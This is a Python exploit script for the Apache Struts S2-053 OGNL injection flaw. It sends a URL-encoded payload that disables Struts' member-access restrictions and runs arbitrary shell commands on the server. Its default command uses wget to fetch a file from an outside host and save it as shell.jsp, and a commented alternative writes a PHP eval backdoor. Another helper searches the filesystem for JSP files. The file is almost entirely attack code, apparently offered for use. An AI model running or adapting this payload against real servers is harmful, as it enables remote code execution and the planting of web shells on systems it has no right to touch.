# coding:utf-8
"""
传入参数与规定格式不同
无法执行寻找webpath的命令
能够使用echo写入文件
能够使用weget直接下载文件
"""
import requests
import sys
from urllib import quote


def exploit(url, param, command):
    payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
    link = "{}/?{}={}".format(url, param, quote(payload))
    res = requests.get(link, timeout=10)
    print res.content
    return res.content
    # if res.status_code == 200:
    #     print "[+] Response: {}".format(str(res.text))
    #     print "\n[+] Exploit Finished!"
    # else:
    #     print "\n[!] Exploit Failed!"


def getwebpath(url, param):
    command = 'find / -name *.jsp'
    str = exploit(url, param, command)
    print str

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print """****S2-053 Exploit****
    Usage:
        exploit.py <url> <param> <command>
    Example:
        exploit.py "http://127.0.0.1/" "name" "uname -a"
            """
        # exit()
    url = 'http://127.0.0.1:8085/'
    param = 'name'
    # command = '''echo "<?php @eval($_POST[__RANDPASS__]); ?>" > shell01.jsp'''
    command = '''wget http://172.22.209.33:8014/api/download -O shell.jsp'''
    #payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""
    # Can show the echo message
    # payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
    # link = "{}/?{}={}".format(url, param, quote(payload))
    # print "[*] Generated EXP: {}".format(link)
    # print "\n[*] Exploiting..."
    exploit(url, param, command)
    # webpath = getwebpath(url, param)